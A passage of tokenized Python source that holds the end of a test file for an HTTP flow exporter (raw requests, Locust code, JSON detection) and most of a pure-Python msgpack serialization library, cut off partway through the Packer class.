( "data/test_flow_export/python_patch.py" , export . python_code ( flow ) ) <newline> <dedent> <dedent> class TestRawRequest ( ) : <newline> <indent> def test_get ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_get ( ) ) <newline> result = dedent (  """ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ GET ▁ /path?a=foo&a=bar&b=baz ▁ HTTP/1.1 <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ header: ▁ qvalue <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ content-length: ▁ 7 <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ host: ▁ address:22 <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ """  ) . strip ( " ▁ " ) . lstrip ( ) <newline> assert export . raw_request ( flow ) == result <newline> <dedent> def test_post ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_post ( ) ) <newline> result = dedent (  """ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ POST ▁ /path ▁ HTTP/1.1 <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ host: ▁ address:22 <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ content <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ """  ) . strip ( ) <newline> assert export . raw_request ( flow ) == result <newline> <dedent> def test_patch ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_patch ( ) ) <newline> result = dedent (  """ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ PATCH ▁ /path?query=param ▁ HTTP/1.1 <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ header: ▁ qvalue <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ content-length: ▁ 7 <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ host: ▁ address:22 <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ content <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ """  ) . strip ( ) <newline> assert export . raw_request ( flow ) == result <newline> <dedent> <dedent> class TestExportLocustCode ( ) : <newline> <indent> def test_get ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_get ( ) ) <newline> python_equals ( "data/test_flow_export/locust_get.py" , export . locust_code ( flow ) ) <newline> <dedent> def test_post ( self ) : <newline> <indent> p = req_post ( ) <newline> p . content = b'content' <newline> p . headers = '' <newline> flow = tutils . tflow ( req = p ) <newline> python_equals ( "data/test_flow_export/locust_post.py" , export . locust_code ( flow ) ) <newline> <dedent> def test_patch ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_patch ( ) ) <newline> python_equals ( "data/test_flow_export/locust_patch.py" , export . locust_code ( flow ) ) <newline> <dedent> <dedent> class TestExportLocustTask ( ) : <newline> <indent> def test_get ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_get ( ) ) <newline> python_equals ( "data/test_flow_export/locust_task_get.py" , export . locust_task ( flow ) ) <newline> <dedent> def test_post ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_post ( ) ) <newline> python_equals ( "data/test_flow_export/locust_task_post.py" , export . locust_task ( flow ) ) <newline> <dedent> def test_patch ( self ) : <newline> <indent> flow = tutils . tflow ( req = req_patch ( ) ) <newline> python_equals ( "data/test_flow_export/locust_task_patch.py" , export . locust_task ( flow ) ) <newline> <dedent> <dedent> class TestIsJson ( ) : <newline> <indent> def test_empty ( self ) : <newline> <indent> assert export . is_json ( None , None ) is False <newline> <dedent> def test_json_type ( self ) : <newline> <indent> headers = Headers ( content_type = "application/json" ) <newline> assert export . is_json ( headers , b"foobar" ) is False <newline> <dedent> def test_valid ( self ) : <newline> <indent> headers = Headers ( content_type = "application/foobar" ) <newline> j = export . is_json ( headers , b'{"name": ▁"example", ▁"email": ▁"example@example.com"}' ) <newline> assert j is False <newline> <dedent> def test_valid2 ( self ) : <newline> <indent> headers = Headers ( content_type = "application/json" ) <newline> j = export . is_json ( headers , b'{"name": ▁"example", ▁"email": ▁"example@example.com"}' ) <newline> assert isinstance ( j , dict ) <newline> <dedent> <dedent>
 """ Fallback ▁ pure ▁ Python ▁ implementation ▁ of ▁ msgpack """  <newline> import sys <newline> import array <newline> import struct <newline> if sys . version_info [ 0 ] == 3 : <newline> <indent> PY3 = True <newline> int_types = int <newline> Unicode = str <newline> xrange = range <newline> def dict_iteritems ( d ) : <newline> <indent> return d . items ( ) <newline> <dedent> <dedent> else : <newline> <indent> PY3 = False <newline> int_types = ( int , long ) <newline> Unicode = unicode <newline> def dict_iteritems ( d ) : <newline> <indent> return d . iteritems ( ) <newline> <dedent> <dedent> if hasattr ( sys , 'pypy_version_info' ) : <newline>  # ▁ cStringIO ▁ is ▁ slow ▁ on ▁ PyPy, ▁ StringIO ▁ is ▁ faster. ▁ However: ▁ PyPy's ▁ own <encdom>  # ▁ StringBuilder ▁ is ▁ fastest. <encdom> <indent> from __pypy__ import newlist_hint <newline> from __pypy__ . builders import StringBuilder <newline> USING_STRINGBUILDER = True <newline> class StringIO ( object ) : <newline> <indent> def __init__ ( self , s = b'' ) : <newline> <indent> if s : <newline> <indent> self . builder = StringBuilder ( len ( s ) ) <newline> self . builder . append ( s ) <newline> <dedent> else : <newline> <indent> self . builder = StringBuilder ( ) <newline> <dedent> <dedent> def write ( self , s ) : <newline> <indent> self . builder . append ( s ) <newline> <dedent> def getvalue ( self ) : <newline> <indent> return self . builder . build ( ) <newline> <dedent> <dedent> <dedent> else : <newline> <indent> USING_STRINGBUILDER = False <newline> from io import BytesIO as StringIO <newline> newlist_hint = lambda size : [ ] <newline> <dedent> from msgpack . exceptions import ( BufferFull , OutOfData , UnpackValueError , PackValueError , ExtraData ) <newline> from msgpack import ExtType <newline> EX_SKIP = 0 <newline> EX_CONSTRUCT = 1 <newline> EX_READ_ARRAY_HEADER = 2 <newline> EX_READ_MAP_HEADER = 3 <newline> TYPE_IMMEDIATE = 0 <newline> TYPE_ARRAY = 1 <newline> TYPE_MAP = 2 <newline> TYPE_RAW = 3 <newline> TYPE_BIN = 4 <newline> TYPE_EXT = 5 <newline> DEFAULT_RECURSE_LIMIT = 511 <newline> def unpack ( stream , ** kwargs ) : <newline> <indent>  """ <strnewline> ▁ Unpack ▁ an ▁ object ▁ from ▁ `stream`. <strnewline> <strnewline> ▁ Raises ▁ `ExtraData` ▁ when ▁ `packed` ▁ contains ▁ extra ▁ bytes. <strnewline> ▁ See ▁ :class:`Unpacker` ▁ for ▁ options. <strnewline> ▁ """  <newline> unpacker = Unpacker ( stream , ** kwargs ) <newline> ret = unpacker . _fb_unpack ( ) <newline> if unpacker . _fb_got_extradata ( ) : <newline> <indent> raise ExtraData ( ret , unpacker . _fb_get_extradata ( ) ) <newline> <dedent> return ret <newline> <dedent> def unpackb ( packed , ** kwargs ) : <newline> <indent>  """ <strnewline> ▁ Unpack ▁ an ▁ object ▁ from ▁ `packed`. <strnewline> <strnewline> ▁ Raises ▁ `ExtraData` ▁ when ▁ `packed` ▁ contains ▁ extra ▁ bytes. <strnewline> ▁ See ▁ :class:`Unpacker` ▁ for ▁ options. <strnewline> ▁ """  <newline> unpacker = Unpacker ( None , ** kwargs ) <newline> unpacker . feed ( packed ) <newline> try : <newline> <indent> ret = unpacker . _fb_unpack ( ) <newline> <dedent> except OutOfData : <newline> <indent> raise UnpackValueError ( "Data ▁ is ▁ not ▁ enough." ) <newline> <dedent> if unpacker . _fb_got_extradata ( ) : <newline> <indent> raise ExtraData ( ret , unpacker . _fb_get_extradata ( ) ) <newline> <dedent> return ret <newline> <dedent> class Unpacker ( object ) : <newline> <indent>  """ <strnewline> ▁ Streaming ▁ unpacker. <strnewline> <strnewline> ▁ `file_like` ▁ is ▁ a ▁ file-like ▁ object ▁ having ▁ a ▁ `.read(n)` ▁ method. <strnewline> ▁ When ▁ `Unpacker` ▁ is ▁ initialized ▁ with ▁ a ▁ `file_like`, ▁ `.feed()` ▁ is ▁ not <strnewline> ▁ usable. <strnewline> <strnewline> ▁ `read_size` ▁ is ▁ used ▁ for ▁ `file_like.read(read_size)`. <strnewline> <strnewline> ▁ If ▁ `use_list` ▁ is ▁ True ▁ (default), ▁ msgpack ▁ lists ▁ are ▁ deserialized ▁ to ▁ Python <strnewline> ▁ lists. ▁ Otherwise ▁ they ▁ are ▁ deserialized ▁ to ▁ tuples. <strnewline> <strnewline> ▁ `object_hook` ▁ is ▁ the ▁ same ▁ as ▁ in ▁ simplejson. ▁ If ▁ it ▁ is ▁ not ▁ None, ▁ it ▁ should <strnewline> ▁ be ▁ callable ▁ and ▁ Unpacker ▁ calls ▁ it ▁ with ▁ a ▁ dict ▁ argument ▁ after ▁ deserializing <strnewline> ▁ a ▁ map. <strnewline> <strnewline> ▁ `object_pairs_hook` ▁ is ▁ the ▁ same ▁ as ▁ in ▁ simplejson. ▁ If ▁ it ▁ is ▁ not ▁ None, ▁ it <strnewline> ▁ should ▁ be ▁ callable ▁ and ▁ Unpacker ▁ calls ▁ it ▁ with ▁ a ▁ list ▁ of ▁ key-value ▁ pairs <strnewline> ▁ after ▁ deserializing ▁ a ▁ map. <strnewline> <strnewline> ▁ `ext_hook` ▁ is ▁ callback ▁ for ▁ ext ▁ (User ▁ defined) ▁ type. ▁ It ▁ called ▁ with ▁ two <strnewline> ▁ arguments: ▁ (code, ▁ bytes). ▁ default: ▁ `msgpack.ExtType` <strnewline> <strnewline> ▁ `encoding` ▁ is ▁ the ▁ encoding ▁ used ▁ for ▁ decoding ▁ msgpack ▁ bytes. ▁ If ▁ it ▁ is <strnewline> ▁ None ▁ (default), ▁ msgpack ▁ bytes ▁ are ▁ deserialized ▁ to ▁ Python ▁ bytes. <strnewline> <strnewline> ▁ `unicode_errors` ▁ is ▁ used ▁ for ▁ decoding ▁ bytes. <strnewline> <strnewline> ▁ `max_buffer_size` ▁ limits ▁ the ▁ buffer ▁ size. ▁ 0 ▁ means ▁ INT_MAX ▁ (default). <strnewline> <strnewline> ▁ Raises ▁ `BufferFull` ▁ exception ▁ when ▁ it ▁ is ▁ unsufficient. <strnewline> <strnewline> ▁ You ▁ should ▁ set ▁ this ▁ parameter ▁ when ▁ unpacking ▁ data ▁ from ▁ an ▁ untrustred ▁ source. <strnewline> <strnewline> ▁ example ▁ of ▁ streaming ▁ deserialization ▁ from ▁ file-like ▁ object:: <strnewline> <strnewline> ▁ unpacker ▁ = ▁ Unpacker(file_like) <strnewline> ▁ for ▁ o ▁ in ▁ unpacker: <strnewline> ▁ do_something(o) <strnewline> <strnewline> ▁ example ▁ of ▁ streaming ▁ deserialization ▁ from ▁ socket:: <strnewline> <strnewline> ▁ unpacker ▁ = ▁ Unpacker() <strnewline> ▁ while ▁ 1: <strnewline> ▁ buf ▁ = ▁ sock.recv(1024*2) <strnewline> ▁ if ▁ not ▁ buf: <strnewline> ▁ break <strnewline> ▁ unpacker.feed(buf) <strnewline> ▁ for ▁ o ▁ in ▁ unpacker: <strnewline> ▁ do_something(o) <strnewline> ▁ """  <newline> def __init__ ( self , file_like = None , read_size = 0 , use_list = True , object_hook = None , object_pairs_hook = None , list_hook = None , encoding = None , unicode_errors = 'strict' , max_buffer_size = 0 , ext_hook = ExtType ) : <newline> <indent> if file_like is None : <newline> <indent> self . _fb_feeding = True <newline> <dedent> else : <newline> <indent> if not callable ( file_like . read ) : <newline> <indent> raise TypeError ( "`file_like.read` ▁ must ▁ be ▁ callable" ) <newline> <dedent> self . file_like = file_like <newline> self . _fb_feeding = False <newline> <dedent> self . _fb_buffers = [ ] <newline> self . _fb_buf_o = 0 <newline> self . _fb_buf_i = 0 <newline> self . _fb_buf_n = 0 <newline> self . _max_buffer_size = max_buffer_size or 2 ** 31 - 1 <newline> if read_size > self . _max_buffer_size : <newline> <indent> raise ValueError ( "read_size ▁ must ▁ be ▁ smaller ▁ than ▁ max_buffer_size" ) <newline> <dedent> self . _read_size = read_size or min ( self . _max_buffer_size , 2048 ) <newline> self . _encoding = encoding <newline> self . _unicode_errors = unicode_errors <newline> self . _use_list = use_list <newline> self . _list_hook = list_hook <newline> self . _object_hook = object_hook <newline> self . _object_pairs_hook = object_pairs_hook <newline> self . _ext_hook = ext_hook <newline> if list_hook is not None and not callable ( list_hook ) : <newline> <indent> raise TypeError ( '`list_hook` ▁ is ▁ not ▁ callable' ) <newline> <dedent> if object_hook is not None and not callable ( object_hook ) : <newline> <indent> raise TypeError ( '`object_hook` ▁ is ▁ not ▁ callable' ) <newline> <dedent> if object_pairs_hook is not None and not callable ( object_pairs_hook ) : <newline> <indent> raise TypeError ( '`object_pairs_hook` ▁ is ▁ not ▁ callable' ) <newline> <dedent> if object_hook is not None and object_pairs_hook is not None : <newline> <indent> raise TypeError ( "object_pairs_hook ▁ and ▁ object_hook ▁ are ▁ mutually ▁ " "exclusive" ) <newline> <dedent> if not callable ( ext_hook ) : <newline> <indent> raise TypeError ( "`ext_hook` ▁ is ▁ not ▁ callable" ) <newline> <dedent> <dedent> def feed ( self , next_bytes ) : <newline> <indent> if isinstance ( next_bytes , array . array ) : <newline> <indent> next_bytes = next_bytes . tostring ( ) <newline> <dedent> elif isinstance ( next_bytes , bytearray ) : <newline> <indent> next_bytes = bytes ( next_bytes ) <newline> <dedent> assert self . _fb_feeding <newline> if self . _fb_buf_n + len ( next_bytes ) > self . _max_buffer_size : <newline> <indent> raise BufferFull <newline> <dedent> self . _fb_buf_n += len ( next_bytes ) <newline> self . _fb_buffers . append ( next_bytes ) <newline> <dedent> def _fb_consume ( self ) : <newline> <indent> self . _fb_buffers = self . _fb_buffers [ self . _fb_buf_i : ] <newline> if self . _fb_buffers : <newline> <indent> self . _fb_buffers [ 0 ] = self . _fb_buffers [ 0 ] [ self . _fb_buf_o : ] <newline> <dedent> self . _fb_buf_o = 0 <newline> self . _fb_buf_i = 0 <newline> self . _fb_buf_n = sum ( map ( len , self . _fb_buffers ) ) <newline> <dedent> def _fb_got_extradata ( self ) : <newline> <indent> if self . _fb_buf_i != len ( self . _fb_buffers ) : <newline> <indent> return True <newline> <dedent> if self . _fb_feeding : <newline> <indent> return False <newline> <dedent> if not self . file_like : <newline> <indent> return False <newline> <dedent> if self . file_like . read ( 1 ) : <newline> <indent> return True <newline> <dedent> return False <newline> <dedent> def __iter__ ( self ) : <newline> <indent> return self <newline> <dedent> def read_bytes ( self , n ) : <newline> <indent> return self . _fb_read ( n ) <newline> <dedent> def _fb_rollback ( self ) : <newline> <indent> self . _fb_buf_i = 0 <newline> self . _fb_buf_o = 0 <newline> <dedent> def _fb_get_extradata ( self ) : <newline> <indent> bufs = self . _fb_buffers [ self . _fb_buf_i : ] <newline> if bufs : <newline> <indent> bufs [ 0 ] = bufs [ 0 ] [ self . _fb_buf_o : ] <newline> <dedent> return b'' . join ( bufs ) <newline> <dedent> def _fb_read ( self , n , write_bytes = None ) : <newline> <indent> buffs = self . _fb_buffers <newline> if ( write_bytes is None and self . _fb_buf_i < len ( buffs ) and self . _fb_buf_o + n < len ( buffs [ self . _fb_buf_i ] ) ) : <newline> <indent> self . _fb_buf_o += n <newline> return buffs [ self . _fb_buf_i ] [ self . _fb_buf_o - n : self . _fb_buf_o ] <newline> <dedent> ret = b'' <newline> while len ( ret ) != n : <newline> <indent> if self . _fb_buf_i == len ( buffs ) : <newline> <indent> if self . _fb_feeding : <newline> <indent> break <newline> <dedent> tmp = self . file_like . read ( self . _read_size ) <newline> if not tmp : <newline> <indent> break <newline> <dedent> buffs . append ( tmp ) <newline> continue <newline> <dedent> sliced = n - len ( ret ) <newline> ret += buffs [ self . _fb_buf_i ] [ self . _fb_buf_o : self . _fb_buf_o + sliced ] <newline> self . _fb_buf_o += sliced <newline> if self . _fb_buf_o >= len ( buffs [ self . _fb_buf_i ] ) : <newline> <indent> self . _fb_buf_o = 0 <newline> self . _fb_buf_i += 1 <newline> <dedent> <dedent> if len ( ret ) != n : <newline> <indent> self . _fb_rollback ( ) <newline> raise OutOfData <newline> <dedent> if write_bytes is not None : <newline> <indent> write_bytes ( ret ) <newline> <dedent> return ret <newline> <dedent> def _read_header ( self , execute = EX_CONSTRUCT , write_bytes = None ) : <newline> <indent> typ = TYPE_IMMEDIATE <newline> n = 0 <newline> obj = None <newline> c = self . _fb_read ( 1 , write_bytes ) <newline> b = ord ( c ) <newline> if b & 0b10000000 == 0 : <newline> <indent> obj = b <newline> <dedent> elif b & 0b11100000 == 0b11100000 : <newline> <indent> obj = struct . unpack ( "b" , c ) [ 0 ] <newline> <dedent> elif b & 0b11100000 == 0b10100000 : <newline> <indent> n = b & 0b00011111 <newline> obj = self . _fb_read ( n , write_bytes ) <newline> typ = TYPE_RAW <newline> <dedent> elif b & 0b11110000 == 0b10010000 : <newline> <indent> n = b & 0b00001111 <newline> typ = TYPE_ARRAY <newline> <dedent> elif b & 0b11110000 == 0b10000000 : <newline> <indent> n = b & 0b00001111 <newline> typ = TYPE_MAP <newline> <dedent> elif b == 0xc0 : <newline> <indent> obj = None <newline> <dedent> elif b == 0xc2 : <newline> <indent> obj = False <newline> <dedent> elif b == 0xc3 : <newline> <indent> obj = True <newline> <dedent> elif b == 0xc4 : <newline> <indent> typ = TYPE_BIN <newline> n = struct . unpack ( "B" , self . _fb_read ( 1 , write_bytes ) ) [ 0 ] <newline> obj = self . _fb_read ( n , write_bytes ) <newline> <dedent> elif b == 0xc5 : <newline> <indent> typ = TYPE_BIN <newline> n = struct . unpack ( ">H" , self . _fb_read ( 2 , write_bytes ) ) [ 0 ] <newline> obj = self . _fb_read ( n , write_bytes ) <newline> <dedent> elif b == 0xc6 : <newline> <indent> typ = TYPE_BIN <newline> n = struct . unpack ( ">I" , self . _fb_read ( 4 , write_bytes ) ) [ 0 ] <newline> obj = self . _fb_read ( n , write_bytes ) <newline> <dedent> elif b == 0xc7 :  # ▁ ext ▁ 8 <encdom> <newline> <indent> typ = TYPE_EXT <newline> L , n = struct . unpack ( 'Bb' , self . _fb_read ( 2 , write_bytes ) ) <newline> obj = self . _fb_read ( L , write_bytes ) <newline> <dedent> elif b == 0xc8 :  # ▁ ext ▁ 16 <encdom> <newline> <indent> typ = TYPE_EXT <newline> L , n = struct . unpack ( '>Hb' , self . _fb_read ( 3 , write_bytes ) ) <newline> obj = self . _fb_read ( L , write_bytes ) <newline> <dedent> elif b == 0xc9 :  # ▁ ext ▁ 32 <encdom> <newline> <indent> typ = TYPE_EXT <newline> L , n = struct . unpack ( '>Ib' , self . _fb_read ( 5 , write_bytes ) ) <newline> obj = self . _fb_read ( L , write_bytes ) <newline> <dedent> elif b == 0xca : <newline> <indent> obj = struct . unpack ( ">f" , self . _fb_read ( 4 , write_bytes ) ) [ 0 ] <newline> <dedent> elif b == 0xcb : <newline> <indent> obj = struct . unpack ( ">d" , self . _fb_read ( 8 , write_bytes ) ) [ 0 ] <newline> <dedent> elif b == 0xcc : <newline> <indent> obj = struct . unpack ( "B" , self . _fb_read ( 1 , write_bytes ) ) [ 0 ] <newline> <dedent> elif b == 0xcd : <newline> <indent> obj = struct . unpack ( ">H" , self . _fb_read ( 2 , write_bytes ) ) [ 0 ] <newline> <dedent> elif b == 0xce : <newline> <indent> obj = struct . unpack ( ">I" , self . _fb_read ( 4 , write_bytes ) ) [ 0 ] <newline> <dedent> elif b == 0xcf : <newline> <indent> obj = struct . unpack ( ">Q" , self . _fb_read ( 8 , write_bytes ) ) [ 0 ] <newline> <dedent> elif b == 0xd0 : <newline> <indent> obj = struct . unpack ( "b" , self . _fb_read ( 1 , write_bytes ) ) [ 0 ] <newline> <dedent> elif b == 0xd1 : <newline> <indent> obj = struct . unpack ( ">h" , self . _fb_read ( 2 , write_bytes ) ) [ 0 ] <newline> <dedent> elif b == 0xd2 : <newline> <indent> obj = struct . unpack ( ">i" , self . _fb_read ( 4 , write_bytes ) ) [ 0 ] <newline> <dedent> elif b == 0xd3 : <newline> <indent> obj = struct . unpack ( ">q" , self . _fb_read ( 8 , write_bytes ) ) [ 0 ] <newline> <dedent> elif b == 0xd4 :  # ▁ fixext ▁ 1 <encdom> <newline> <indent> typ = TYPE_EXT <newline> n , obj = struct . unpack ( 'b1s' , self . _fb_read ( 2 , write_bytes ) ) <newline> <dedent> elif b == 0xd5 :  # ▁ fixext ▁ 2 <encdom> <newline> <indent> typ = TYPE_EXT <newline> n , obj = struct . unpack ( 'b2s' , self . _fb_read ( 3 , write_bytes ) ) <newline> <dedent> elif b == 0xd6 :  # ▁ fixext ▁ 4 <encdom> <newline> <indent> typ = TYPE_EXT <newline> n , obj = struct . unpack ( 'b4s' , self . _fb_read ( 5 , write_bytes ) ) <newline> <dedent> elif b == 0xd7 :  # ▁ fixext ▁ 8 <encdom> <newline> <indent> typ = TYPE_EXT <newline> n , obj = struct . unpack ( 'b8s' , self . _fb_read ( 9 , write_bytes ) ) <newline> <dedent> elif b == 0xd8 :  # ▁ fixext ▁ 16 <encdom> <newline> <indent> typ = TYPE_EXT <newline> n , obj = struct . unpack ( 'b16s' , self . _fb_read ( 17 , write_bytes ) ) <newline> <dedent> elif b == 0xd9 : <newline> <indent> typ = TYPE_RAW <newline> n = struct . unpack ( "B" , self . _fb_read ( 1 , write_bytes ) ) [ 0 ] <newline> obj = self . _fb_read ( n , write_bytes ) <newline> <dedent> elif b == 0xda : <newline> <indent> typ = TYPE_RAW <newline> n = struct . unpack ( ">H" , self . _fb_read ( 2 , write_bytes ) ) [ 0 ] <newline> obj = self . _fb_read ( n , write_bytes ) <newline> <dedent> elif b == 0xdb : <newline> <indent> typ = TYPE_RAW <newline> n = struct . unpack ( ">I" , self . _fb_read ( 4 , write_bytes ) ) [ 0 ] <newline> obj = self . _fb_read ( n , write_bytes ) <newline> <dedent> elif b == 0xdc : <newline> <indent> n = struct . unpack ( ">H" , self . _fb_read ( 2 , write_bytes ) ) [ 0 ] <newline> typ = TYPE_ARRAY <newline> <dedent> elif b == 0xdd : <newline> <indent> n = struct . unpack ( ">I" , self . _fb_read ( 4 , write_bytes ) ) [ 0 ] <newline> typ = TYPE_ARRAY <newline> <dedent> elif b == 0xde : <newline> <indent> n = struct . unpack ( ">H" , self . _fb_read ( 2 , write_bytes ) ) [ 0 ] <newline> typ = TYPE_MAP <newline> <dedent> elif b == 0xdf : <newline> <indent> n = struct . unpack ( ">I" , self . _fb_read ( 4 , write_bytes ) ) [ 0 ] <newline> typ = TYPE_MAP <newline> <dedent> else : <newline> <indent> raise UnpackValueError ( "Unknown ▁ header: ▁ 0x%x" % b ) <newline> <dedent> return typ , n , obj <newline> <dedent> def _fb_unpack ( self , execute = EX_CONSTRUCT , write_bytes = None ) : <newline> <indent> typ , n , obj = self . _read_header ( execute , write_bytes ) <newline> if execute == EX_READ_ARRAY_HEADER : <newline> <indent> if typ != TYPE_ARRAY : <newline> <indent> raise UnpackValueError ( "Expected ▁ array" ) <newline> <dedent> return n <newline> <dedent> if execute == EX_READ_MAP_HEADER : <newline> <indent> if typ != TYPE_MAP : <newline> <indent> raise UnpackValueError ( "Expected ▁ map" ) <newline> <dedent> return n <newline>  # ▁ TODO ▁ should ▁ we ▁ eliminate ▁ the ▁ recursion? <encdom> <dedent> if typ == TYPE_ARRAY : <newline> <indent> if execute == EX_SKIP : <newline> <indent> for i in xrange ( n ) : <newline>  # ▁ TODO ▁ check ▁ whether ▁ we ▁ need ▁ to ▁ call ▁ `list_hook` <encdom> <indent> self . _fb_unpack ( EX_SKIP , write_bytes ) <newline> <dedent> return <newline> <dedent> ret = newlist_hint ( n ) <newline> for i in xrange ( n ) : <newline> <indent> ret . append ( self . _fb_unpack ( EX_CONSTRUCT , write_bytes ) ) <newline> <dedent> if self . _list_hook is not None : <newline> <indent> ret = self . _list_hook ( ret ) <newline>  # ▁ TODO ▁ is ▁ the ▁ interaction ▁ between ▁ `list_hook` ▁ and ▁ `use_list` ▁ ok? <encdom> <dedent> return ret if self . _use_list else tuple ( ret ) <newline> <dedent> if typ == TYPE_MAP : <newline> <indent> if execute == EX_SKIP : <newline> <indent> for i in xrange ( n ) : <newline>  # ▁ TODO ▁ check ▁ whether ▁ we ▁ need ▁ to ▁ call ▁ hooks <encdom> <indent> self . _fb_unpack ( EX_SKIP , write_bytes ) <newline> self . _fb_unpack ( EX_SKIP , write_bytes ) <newline> <dedent> return <newline> <dedent> if self . _object_pairs_hook is not None : <newline> <indent> ret = self . _object_pairs_hook ( ( self . _fb_unpack ( EX_CONSTRUCT , write_bytes ) , self . _fb_unpack ( EX_CONSTRUCT , write_bytes ) ) for _ in xrange ( n ) ) <newline> <dedent> else : <newline> <indent> ret = { } <newline> for _ in xrange ( n ) : <newline> <indent> key = self . _fb_unpack ( EX_CONSTRUCT , write_bytes ) <newline> ret [ key ] = self . _fb_unpack ( EX_CONSTRUCT , write_bytes ) <newline> <dedent> if self . _object_hook is not None : <newline> <indent> ret = self . _object_hook ( ret ) <newline> <dedent> <dedent> return ret <newline> <dedent> if execute == EX_SKIP : <newline> <indent> return <newline> <dedent> if typ == TYPE_RAW : <newline> <indent> if self . _encoding is not None : <newline> <indent> obj = obj . decode ( self . _encoding , self . _unicode_errors ) <newline> <dedent> return obj <newline> <dedent> if typ == TYPE_EXT : <newline> <indent> return self . _ext_hook ( n , obj ) <newline> <dedent> if typ == TYPE_BIN : <newline> <indent> return obj <newline> <dedent> assert typ == TYPE_IMMEDIATE <newline> return obj <newline> <dedent> def next ( self ) : <newline> <indent> try : <newline> <indent> ret = self . _fb_unpack ( EX_CONSTRUCT , None ) <newline> self . _fb_consume ( ) <newline> return ret <newline> <dedent> except OutOfData : <newline> <indent> raise StopIteration <newline> <dedent> <dedent> __next__ = next <newline> def skip ( self , write_bytes = None ) : <newline> <indent> self . _fb_unpack ( EX_SKIP , write_bytes ) <newline> self . _fb_consume ( ) <newline> <dedent> def unpack ( self , write_bytes = None ) : <newline> <indent> ret = self . _fb_unpack ( EX_CONSTRUCT , write_bytes ) <newline> self . _fb_consume ( ) <newline> return ret <newline> <dedent> def read_array_header ( self , write_bytes = None ) : <newline> <indent> ret = self . _fb_unpack ( EX_READ_ARRAY_HEADER , write_bytes ) <newline> self . _fb_consume ( ) <newline> return ret <newline> <dedent> def read_map_header ( self , write_bytes = None ) : <newline> <indent> ret = self . _fb_unpack ( EX_READ_MAP_HEADER , write_bytes ) <newline> self . _fb_consume ( ) <newline> return ret <newline> <dedent> <dedent> class Packer ( object ) : <newline> <indent>  """ <strnewline> ▁ MessagePack ▁ Packer <strnewline> <strnewline> ▁ usage: <strnewline> <strnewline> ▁ packer ▁ = ▁ Packer() <strnewline> ▁ astream.write(packer.pack(a)) <strnewline> ▁ astream.write(packer.pack(b)) <strnewline> <strnewline> ▁ Packer's ▁ constructor ▁ has ▁ some ▁ keyword ▁ arguments: <strnewline> <strnewline> ▁ :param ▁ callable ▁ default: <strnewline> ▁ Convert ▁ user ▁ type ▁ to ▁ builtin ▁ type ▁ that ▁ Packer ▁ supports. <strnewline> ▁ See ▁ also ▁ simplejson's ▁ document. <strnewline> ▁ :param ▁ str ▁ encoding: <strnewline> ▁ Convert ▁ unicode ▁ to ▁ bytes ▁ with ▁ this ▁ encoding. ▁ (default: ▁'utf-8') <strnewline> ▁ :param ▁ str ▁ unicode_errors: <strnewline> ▁ Error ▁ handler ▁ for ▁ encoding ▁ unicode. ▁ (default: ▁'strict') <strnewline> ▁ :param ▁ bool ▁ use_single_float: <strnewline> ▁ Use ▁ single ▁ precision ▁ float ▁ type ▁ for ▁ float. ▁ (default: ▁ False) <strnewline> ▁ :param ▁ bool ▁ autoreset: <strnewline> ▁ Reset ▁ buffer ▁ after ▁ each ▁ pack ▁ and ▁ return ▁ it's ▁ content ▁ as ▁ `bytes`. ▁ (default: ▁ True). <strnewline> ▁ If ▁ set ▁ this ▁ to ▁ false, ▁ use ▁ `bytes()` ▁ to ▁ get ▁ content ▁ and ▁ `.reset()` ▁ to ▁ clear ▁ buffer. <strnewline> ▁ :param ▁ bool ▁ use_bin_type: <strnewline> ▁ Use ▁ bin ▁ type ▁ introduced ▁ in ▁ msgpack ▁ spec ▁ 2.0 ▁ for ▁ bytes. <strnewline> ▁ It ▁ also ▁ enable ▁ str8 ▁ type ▁ for ▁ unicode. <strnewline> ▁ """  <newline> def __init__ ( self , default = None , encoding = 'utf-8' , unicode_errors = 'strict' , use_single_float = False , autoreset = True , use_bin_type = False ) : <newline> <indent> self . _use_float = use_single_float <newline> self . _autoreset = autoreset <newline> self . _use_bin_type = use_bin_type <newline> self . _encoding = encoding <newline> self . _unicode_errors = unicode_errors <newline> self . _buffer = StringIO ( ) <newline> if default is not None : <newline> <indent> if not callable ( default ) : <newline> <indent> raise TypeError ( "default ▁ must ▁ be ▁ callable" ) <newline> <dedent> <dedent> self . _default = default <newline> <dedent> def _pack ( self , obj , nest_limit = DEFAULT_RECURSE_LIMIT , isinstance = isinstance ) : <newline> <indent> default_used = False <newline> while True : <newline> <indent> if nest_limit < 0 : <newline> <indent> raise PackValueError ( "recursion ▁ limit ▁ 